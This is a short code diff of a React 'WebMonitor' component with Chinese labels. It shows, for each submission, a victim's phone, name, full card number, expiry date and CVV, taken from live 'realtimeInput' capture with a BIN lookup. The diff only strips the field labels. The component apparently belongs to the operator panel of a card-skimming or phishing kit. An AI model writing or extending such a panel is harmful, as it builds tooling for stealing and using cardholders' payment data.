@@ -278,7 +278,6 @@ export function WebMonitor() {
               {/* 中部：卡的类型、手机号、姓名、卡号、有效期、CVV */}
               <div className="grid grid-cols-6 gap-4 mb-3">
                 <div>
-                  <div className="text-xs text-muted-foreground mb-1">卡的类型</div>
                   {submission.binLookup ? (
                     <div className="flex items-center gap-1">
                       <div className="text-xs text-muted-foreground">💳</div>
@@ -300,35 +299,30 @@ export function WebMonitor() {
                 </div>
 
                 <div>
-                  <div className="text-xs text-muted-foreground mb-1">手机号</div>
                   <div className="text-sm font-mono">
                     {submission.realtimeInput?.phone || 'N/A'}
                   </div>
                 </div>
 
                 <div>
-                  <div className="text-xs text-muted-foreground mb-1">姓名</div>
                   <div className="text-sm font-medium">
                     {submission.userName}
                   </div>
                 </div>
 
                 <div>
-                  <div className="text-xs text-muted-foreground mb-1">卡号</div>
                   <div className="text-sm font-mono">
                     {submission.realtimeInput?.cardNumber || 'N/A'}
                   </div>
                 </div>
 
                 <div>
-                  <div className="text-xs text-muted-foreground mb-1">有效期</div>
                   <div className="text-sm font-mono">
                     {submission.realtimeInput?.expiryDate || 'N/A'}
                   </div>
                 </div>
 
                 <div>
-                  <div className="text-xs text-muted-foreground mb-1">CVV</div>
                   <div className="text-sm font-mono">
                     {submission.realtimeInput?.cvv || 'N/A'}
                   </div>
